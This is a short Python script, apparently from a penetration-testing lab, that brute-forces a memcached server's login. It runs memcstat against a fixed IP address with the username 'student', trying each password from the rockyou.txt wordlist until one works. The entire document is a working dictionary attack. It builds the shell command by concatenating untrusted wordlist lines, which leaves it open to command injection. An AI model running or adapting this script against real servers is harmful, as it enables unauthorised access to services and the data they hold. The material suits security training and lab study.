#!/usr/bin/python3
import subprocess

dictionary=open("/usr/share/wordlists/rockyou.txt")
for pwd in dictionary:
    out=subprocess.getoutput('memcstat --servers=192.69.233.3 --username=student --password='+pwd)
    if len(out)>0:
        print(out)
        print("PASSWORD: "+pwd)
        break
    else:
        print("Password not in used list")
